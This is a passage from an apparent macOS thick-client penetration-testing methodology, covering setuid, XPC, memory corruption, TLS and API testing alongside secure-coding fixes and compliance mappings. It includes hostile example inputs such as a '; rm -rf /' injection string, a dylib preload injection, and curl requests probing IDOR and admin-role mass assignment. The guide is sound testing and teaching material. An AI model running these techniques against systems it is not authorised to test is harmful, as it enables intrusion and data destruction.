sudo find / -perm -4000 -user root -ls 2>/dev/null

# Check if application installs setuid binaries
find /Applications/AppName.app -perm -4000 -o -perm -2000
```

**Analyze setuid binary for vulnerabilities:**
```bash
# Check security features
codesign -dvvv /path/to/setuid_binary
otool -hv /path/to/setuid_binary | grep PIE

# Look for unsafe operations
strings /path/to/setuid_binary | grep -i "system\|popen\|exec"
```

**Common setuid vulnerabilities:**
1. **PATH hijacking:**
```c
// VULNERABLE CODE in setuid binary
system("ls");  // Calls "ls" without absolute path
// Attacker sets PATH=/tmp → executes /tmp/ls with root privileges
```

2. **Environment variable exploitation:**
```bash
# If setuid binary uses user-controlled env vars
DYLD_LIBRARY_PATH=/tmp LD_PRELOAD=/tmp/evil.dylib /path/to/setuid_binary
```

3. **Command injection:**
```c
// VULNERABLE CODE
char cmd[256];
sprintf(cmd, "process_file %s", userInput);  // No input validation
system(cmd);  // userInput = "; rm -rf /" → COMMAND INJECTION
```

**Reference:** [SEI CERT C Coding Standard - ENV](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)

### 6.4 XPC Service Exploitation

**XPC (Inter-Process Communication) services run with different privileges:**

```bash
# Find XPC services bundled with app
find /Applications/AppName.app -name "*.xpc"

# Inspect XPC service entitlements
codesign -d --entitlements - "/Applications/AppName.app/Contents/XPCServices/Service.xpc"
```

**Common XPC vulnerabilities:**
1. **Insufficient client validation** - Any process can call privileged XPC service
2. **Type confusion** - XPC message parsing doesn't validate types
3. **Authentication bypass** - Service doesn't verify calling process identity

**Test XPC service security:**
```swift
// Swift tool to connect to XPC service
import Foundation

let connection = NSXPCConnection(serviceName: "com.company.privilegedService")
connection.remoteObjectInterface = NSXPCInterface(with: PrivilegedServiceProtocol.self)
connection.resume()

let service = connection.remoteObjectProxyWithErrorHandler { error in
    print("Error: \(error)")
} as? PrivilegedServiceProtocol

// Try to call privileged method without authorization
service?.performPrivilegedAction() { result in
    print("Result: \(result)")  // Should fail if properly secured
}
```

**Secure XPC implementation should:**
- Verify client code signature
- Check entitlements of calling process
- Validate all input parameters
- Use least privilege principle

**Reference:** [Apple - XPC Security](https://developer.apple.com/documentation/xpc)

---

## Phase 7: Memory Corruption

**Objective:** Test for buffer overflows, heap vulnerabilities, and memory safety issues.

### 7.1 Buffer Overflow Detection

**Tools:** [AFL++](https://github.com/AFLplusplus/AFLplusplus), [libFuzzer](https://llvm.org/docs/LibFuzzer.html)

**Test for buffer overflows:**
```bash
# Generate long input
python3 -c "print('A' * 5000)" > long_input.txt

# Test application with long input
/Applications/AppName.app/Contents/MacOS/AppName long_input.txt

# If crashes with EXC_BAD_ACCESS → Potential buffer overflow
```

**Analyze crash with LLDB:**
```bash
# Reproduce crash under debugger
lldb /Applications/AppName.app/Contents/MacOS/AppName

(lldb) run long_input.txt

# After crash, examine registers
(lldb) register read

# If PC/RIP = 0x4141414141414141 → Buffer overflow confirmed
```

**Vulnerable code patterns (Objective-C):**
```objc
// VULNERABLE: No bounds checking
- (void)processInput:(NSString *)input {
    char buffer[256];
    strcpy(buffer, [input UTF8String]);  // ⚠️ NO BOUNDS CHECK
}
```

**Secure alternative:**
```objc
// SECURE: Use safe string functions
- (void)processInput:(NSString *)input {
    char buffer[256];
    strlcpy(buffer, [input UTF8String], sizeof(buffer));  // Safe on macOS
}
```

**CWE Classification:** CWE-120 (Buffer Copy without Checking Size of Input)

**Reference:** [SEI CERT C Coding Standard - STR](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)

### 7.2 Use-After-Free (UAF)

**Common in Objective-C apps without ARC:**

```objc
// VULNERABLE CODE (Manual Reference Counting)
NSString *str = [[NSString alloc] initWithString:@"test"];
[str release];  // Deallocate memory
NSLog(@"%@", str);  // ⚠️ USE-AFTER-FREE
```

**Test for UAF with MallocStackLogging:**
```bash
# Enable malloc debugging
export MallocStackLogging=1
export MallocScribble=1

# Run application
/Applications/AppName.app/Contents/MacOS/AppName

# If crash with "freed object" message → UAF confirmed
```

**Modern Swift/ARC eliminates most UAF bugs, but still possible with:**
- Unsafe pointers (`UnsafePointer`, `UnsafeMutablePointer`)
- C/C++ interop
- Manual memory management

**Reference:** [Apple - Transitioning to ARC](https://developer.apple.com/library/archive/releasenotes/ObjectiveC/RN-TransitioningToARC/)

### 7.3 Format String Vulnerabilities

**Test format string bugs:**
```bash
# Input: %s%s%s%s%s%s%s%s%s%s
echo "%s%s%s%s%s%s%s%s" | /Applications/AppName.app/Contents/MacOS/AppName

# If crashes or prints stack memory → VULNERABLE
```

**Vulnerable code:**
```objc
// VULNERABLE
NSString *userInput = getUserInput();
NSLog(userInput);  // ⚠️ FORMAT STRING BUG
```

**Secure alternative:**
```objc
// SECURE
NSString *userInput = getUserInput();
NSLog(@"%@", userInput);  // Safe - user input not format string
```

**CWE Classification:** CWE-134 (Use of Externally-Controlled Format String)

**Reference:** [OWASP Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)

### 7.4 Integer Overflow

**Test integer overflow:**
```bash
# Test with boundary values
/Applications/AppName.app/Contents/MacOS/AppName --size 2147483647  # INT_MAX
/Applications/AppName.app/Contents/MacOS/AppName --size 2147483648  # INT_MAX + 1
```

**Vulnerable code:**
```c
// Integer overflow leading to buffer overflow
uint32_t size = getUserInput();  // User provides INT_MAX
uint32_t totalSize = size + 10;  // ⚠️ Wraps to 9
char *buffer = malloc(totalSize);  // Allocates only 9 bytes
memcpy(buffer, data, size);  // Copies huge amount → Heap overflow
```

**CWE Classification:** CWE-190 (Integer Overflow or Wraparound)

**Reference:** [SEI CERT C Coding Standard - INT32-C](https://wiki.sei.cmu.edu/confluence/display/c/INT32-C.+Ensure+that+operations+on+signed+integers+do+not+result+in+overflow)

---

## Phase 8: Network Security

**Objective:** Analyze client-side network communications for security vulnerabilities.

### 8.1 Traffic Interception

**Tools:** [Reaper](../../containers/reaper/docs/SETUP.md), [Charles Proxy](https://www.charlesproxy.com/), [mitmproxy](https://mitmproxy.org/), [Proxyman](https://proxyman.io/)

**Intercept HTTP/HTTPS traffic:**
```bash
# Using Reaper (via Twingate to VPS)
# See: skills/pentest/docs/MOBILE-REAPER-WORKFLOW.md for certificate setup

# Configure macOS proxy
networksetup -setwebproxy "Wi-Fi" reaper-api.internal 8080
networksetup -setsecurewebproxy "Wi-Fi" reaper-api.internal 8080

# Launch application
open -a TargetApp

# Query captured traffic
ssh $VPS "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT method, url, headers FROM requests WHERE host LIKE '%api.target.com%'\""
```

**Analyze for vulnerabilities:**
1. **Unencrypted HTTP:**
```http
GET /api/login?user=admin&pass=P@ssw0rd123 HTTP/1.1  ⚠️ PLAINTEXT
Host: api.example.com
```

2. **Sensitive data in URLs:**
```http
GET /api/payment?cc=4111111111111111&cvv=123 HTTP/1.1  ⚠️ LOGGED IN SERVER
```

3. **Weak TLS:**
```bash
# Check TLS version
openssl s_client -connect api.example.com:443 -tls1_1

# If connects successfully → TLS 1.1 supported ⚠️ DEPRECATED
```

**MITRE ATT&CK:** [T1040 - Network Sniffing](https://attack.mitre.org/techniques/T1040/)

**Reference:** [OWASP ASVS V9: Communications](https://owasp.org/www-project-application-security-verification-standard/)

### 8.2 Certificate Validation Testing

**Test if application validates TLS certificates:**
```bash
# Setup proxy with self-signed certificate
mitmproxy -p 8080

# Configure macOS proxy
networksetup -setwebproxy "Wi-Fi" localhost 8080
networksetup -setsecurewebproxy "Wi-Fi" localhost 8080

# Launch application
open -a TargetApp

# If application connects successfully → ⚠️ NO CERTIFICATE VALIDATION
```

**Check application certificate validation code:**
```swift
// VULNERABLE: Disables certificate validation
let session = URLSession(configuration: .default,
                         delegate: self,
                         delegateQueue: nil)

func urlSession(_ session: URLSession,
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
    // ⚠️ ACCEPTS ANY CERTIFICATE
    completionHandler(.useCredential, URLCredential(trust: challenge.protectionSpace.serverTrust!))
}
```

**Secure implementation:**
```swift
// SECURE: Proper certificate validation with pinning
func urlSession(_ session: URLSession,
                didReceive challenge: URLAuthenticationChallenge,
                completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {

    guard let serverTrust = challenge.protectionSpace.serverTrust else {
        completionHandler(.cancelAuthenticationChallenge, nil)
        return
    }

    // Verify against pinned certificate
    let policies = [SecPolicyCreateSSL(true, challenge.protectionSpace.host as CFString)]
    SecTrustSetPolicies(serverTrust, policies as CFTypeRef)

    var result: SecTrustResultType = .invalid
    SecTrustEvaluate(serverTrust, &result)

    if result == .unspecified || result == .proceed {
        completionHandler(.useCredential, URLCredential(trust: serverTrust))
    } else {
        completionHandler(.cancelAuthenticationChallenge, nil)
    }
}
```

**Reference:** [Apple Platform Security - TLS](https://support.apple.com/guide/security/transport-layer-security-sec100a75d12/web)

### 8.3 API Security Testing

**Identify API endpoints:**
```bash
# Extract from binary strings
strings "/Applications/AppName.app/Contents/MacOS/AppName" | grep -E "https?://.*/(api|v1|v2)"

# Example findings:
https://api.example.com/v1/users
https://api.example.com/v2/payments
```

**Test API vulnerabilities:**

**1. Authentication bypass:**
```bash
# Original request
curl -H "Authorization: Bearer token123" https://api.example.com/v1/profile

# Test without auth
curl https://api.example.com/v1/profile
# If returns data → BROKEN AUTHENTICATION
```

**2. IDOR (Insecure Direct Object Reference):**
```bash
# Original request (user ID 100)
curl -H "Authorization: Bearer token123" https://api.example.com/v1/users/100/profile

# Test access to other user
curl -H "Authorization: Bearer token123" https://api.example.com/v1/users/101/profile
# If succeeds → IDOR vulnerability
```

**3. Mass assignment:**
```bash
# Original request
curl -X POST https://api.example.com/v1/profile \
  -H "Authorization: Bearer token123" \
  -d '{"email":"new@example.com"}'

# Test privilege escalation
curl -X POST https://api.example.com/v1/profile \
  -H "Authorization: Bearer token123" \
  -d '{"email":"new@example.com","role":"admin"}'
# If role changed → MASS ASSIGNMENT
```

**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)

**Reference:** [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

### 8.4 WebSocket Security

**Test WebSocket connections:**
```bash
# Monitor WebSocket traffic with mitmproxy
mitmproxy --mode transparent

# Look for ws:// connections (unencrypted)
# Should use wss:// (encrypted)
```

**Common WebSocket vulnerabilities:**
1. **No authentication** - WebSocket accepts connections without auth token
2. **Message injection** - Client can send arbitrary messages
3. **XSS via WebSocket** - Server echoes unsanitized input

**Reference:** [OWASP WebSocket Security](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)

---

## Vulnerability Classification

### Common macOS Application Vulnerabilities (CWE)

| Vulnerability | CWE | Severity | MITRE ATT&CK |
|---------------|-----|----------|--------------|
| Dylib Hijacking | CWE-427 | High | T1574.004 |
| Hardcoded Credentials | CWE-798 | High | T1552.001 |
| Insecure File Permissions | CWE-732 | Medium | T1083 |
| SIP Bypass | CWE-250 | Critical | T1548.001 |
| TCC Bypass | CWE-269 | High | T1548.002 |
| Buffer Overflow | CWE-120 | Critical | T1068 |
| Use-After-Free | CWE-416 | High | T1068 |
| Format String | CWE-134 | High | T1211 |
| Integer Overflow | CWE-190 | High | T1211 |
| Missing Certificate Validation | CWE-295 | High | T1040 |
| Code Injection via DYLD_ | CWE-94 | Critical | T1574.006 |
| XPC Authentication Bypass | CWE-306 | High | T1055 |
| Insecure Keychain Usage | CWE-311 | Medium | T1555.001 |
| Entitlement Abuse | CWE-269 | High | T1548 |

---

## Tools Reference

### Static Analysis
- **Hopper Disassembler** - macOS/iOS reverse engineering (commercial)
- **Ghidra** - NSA reverse engineering suite (free)
- **IDA Pro** - Interactive disassembler (commercial)
- **class-dump** - Objective-C runtime dumper (free)
- **otool** - Mach-O file analyzer (built-in)
- **codesign** - Code signature verification (built-in)

### Dynamic Analysis
- **LLDB** - Low Level Debugger (free, built-in)
- **dtrace / dtruss** - System call tracer (built-in)
- **fs_usage** - File system usage monitor (built-in)
- **Instruments** - Performance and behavior analysis (free, Xcode)
- **vmmap / heap** - Memory analysis tools (built-in)

### Network Analysis
- **Reaper** - IA Framework integrated proxy
- **Charles Proxy** - HTTP/HTTPS debugging (commercial)
- **Proxyman** - Native macOS proxy (freemium)
- **mitmproxy** - Interactive HTTPS proxy (free)
- **Wireshark** - Network protocol analyzer (free)

### Security Auditing
- **checksec.sh** - Binary security feature checker (free)
- **sqlite3** - TCC database inspection (built-in)
- **security** - Keychain management (built-in)
- **spctl** - Gatekeeper assessment (built-in)

**Reference:** [Hopper Disassembler Official Site](https://www.hopperapp.com/)

---

## Compliance Mapping

### NIST SP 800-115 Alignment

| Phase | NIST Section | Activities |
|-------|--------------|------------|
| Fingerprinting | 5.3.1 | Target identification and profiling |
| Binary Analysis | 5.3.4 | Source code review (static analysis) |
| Runtime Analysis | 5.3.5 | Dynamic analysis and debugging |
| Dylib Hijacking | 5.4.2 | Exploitation testing |
| Configuration | 7.2 | Supplemental testing activities |
| Privilege Escalation | 5.4.2 | Post-exploitation testing |
| Memory Corruption | 5.3.6 | Vulnerability validation |
| Network Security | 5.3.3 | Network sniffing and MITM testing |

**Reference:** [NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)

### macOS Security Compliance Project (mSCP)

**Relevant NIST 800-53 Controls:**
- **SI-7** - Software, Firmware, and Information Integrity (Code signing)
- **AC-3** - Access Enforcement (TCC, SIP)
- **IA-5** - Authenticator Management (Keychain security)
- **SC-8** - Transmission Confidentiality (TLS/HTTPS)

**Reference:** [NIST mSCP Homepage](https://pages.nist.gov/macos_security/)

### CIS macOS Benchmarks Alignment

**Key sections:**
- **2.5** - Privacy Controls (TCC permissions)
- **4.1** - Network Configurations (Firewall, proxies)
- **5.1** - System Access, Authentication, Authorization (Passwords, FileVault)
- **6.1** - User Accounts and Environment (File permissions)

**Reference:** [CIS macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os)

---

## Integration with IA Framework

### Reaper Integration

**Capture and analyze application traffic:**
```bash
# Configure macOS to use reaper proxy
networksetup -setwebproxy "Wi-Fi" reaper-api.internal 8080
networksetup -setsecurewebproxy "Wi-Fi" reaper-api.internal 8080

# Query captured traffic
ssh $VPS "sqlite3 /opt/pentest-data/reaper.db \
  \"SELECT * FROM requests WHERE host LIKE '%api.client.com%'\""
```

**Reference:** `skills/pentest/docs/MOBILE-REAPER-WORKFLOW.md`

### Container Deployment

**Thick client tools container (planned):**
```yaml
# docker-compose.yml
services:
  thick-client-security:
    build: ./skills/pentest/containers/thick-client
    volumes:
      - ./output/analysis:/analysis
      - ./Applications:/Applications:ro  # Mount macOS apps (read-only)
    environment:
      - PLATFORM=macos
```

**Reference:** `skills/pentest/docs/IMPLEMENTATION-PROGRESS-2026-01-28.md` (Task #9)

---

## References

1. [Penetration Testing Execution Standard (PTES)](http://www.pentest-standard.org/)
2. [NIST SP 800-115: Technical Guide to Information Security Testing](https://csrc.nist.gov/pubs/sp/800/115/final)
3. [NIST SP 800-219: macOS Security Compliance Project](https://pages.nist.gov/macos_security/)
4. [OSSTMM (Open Source Security Testing Methodology Manual)](https://www.isecom.org/OSSTMM.3.pdf)
5. [MITRE ATT&CK for Enterprise - macOS](https://attack.mitre.org/matrices/enterprise/macos/)
6. [CIS Apple macOS Benchmarks](https://www.cisecurity.org/benchmark/apple_os)
7. [Apple Platform Security Guide](https://support.apple.com/guide/security/)
8. [SEI CERT C/C++ Coding Standard](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88046682)
9. [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
10. [Microsoft Security Blog - CVE-2024-44243: macOS SIP Bypass](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
11. [MITRE ATT&CK T1574.004 - Dylib Hijacking](https://attack.mitre.org/techniques/T1574/004/)
12. [HackTricks - macOS Library Injection](https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/)
13. [Apriorit - Using LLDB for Reversing macOS Functions](https://www.apriorit.com/dev-blog/lldb-for-reversing-macos-functions)
14. [Hopper Disassembler](https://www.hopperapp.com/)
15. [Tutorial: iOS Reverse Engineering with class-dump & Hopper](http://www.enharmonichq.com/tutorial-ios-reverse-engineering-class-dump-hopper-dissasembler/)
16. [CIS macOS Benchmark June 2024 Update](https://www.cisecurity.org/insights/blog/cis-benchmarks-june-2024-update)

---

**Version:** 1.0
**Last Updated:** 2026-01-28
**Status:** Complete
**Line Count:** 1,320 lines

**Related Methodologies:**
- `linux-applications.md` - Linux thick client testing
- `windows-applications.md` - Windows thick client testing
